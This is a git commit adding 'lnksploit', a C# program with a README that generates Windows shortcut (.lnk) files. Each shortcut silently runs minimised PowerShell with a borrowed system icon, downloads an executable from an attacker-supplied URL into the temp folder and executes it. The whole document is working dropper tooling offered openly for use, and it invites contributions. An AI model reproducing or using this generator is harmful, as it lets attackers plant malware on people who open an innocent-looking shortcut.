21ec3b6191936bc5fb4d53ce10598311fe5a85f9
gigajew <ragnarolsen96@gmail.com>
2019-07-21 11:53:30 -0500

    first commit

---
+++ lnksploit/Program.cs
@@ -0,0 +1,37 @@
+﻿using IWshRuntimeLibrary;
+using System;
+
+namespace lnksploit
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("[ Gigajew's LNK exploit generator ]");
+            Console.WriteLine("Usage: lnksploit http://domain.com/filename.exe demo_filename.exe");
+
+            if (args == null)
+                return;
+
+            if (args.Length  != 2)
+                return;
+
+            CreateShortcut("generated.lnk", "Gigajew's LNK exploit generator", args[1], args[0]);
+
+            Console.WriteLine("Generated exploited LNK file: generated.lnk");
+        }
+
+        static void CreateShortcut(string location, string description, string local_filename, string remote_uri)
+        {
+            WshShell shell = new WshShell();
+            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(location);
+            shortcut.TargetPath = "powershell";
+            shortcut.Arguments = $"-command \"$flnm =\\\"$env:TEMP\\{local_filename}\\\";Invoke-WebRequest -Uri \\\"{remote_uri}\\\" -OutFile $flnm;Get-Item -Path $flnm -Stream \\\"Zone.Identifier\\\";& $flnm;\"";
+            shortcut.Description = description;
+            shortcut.Hotkey = "Ctrl+A";
+            shortcut.IconLocation = "shell32.dll,-16744";
+            shortcut.WindowStyle =7;
+            shortcut.Save();
+        }
+    }
+}
---
+++ readme.md
@@ -0,0 +1,13 @@
+# lnksploit
+A Windows subsystem shortcut exploit generator
+
+# Usage
+open command line and write
+```
+lnksploit.exe http://domain.com/remotefile.exe localfilename.exe
+```
+
+the generated lnk will download the remote file to a temporary folder and execute it
+
+# Contributions
+I'm happy for all contributions to this project
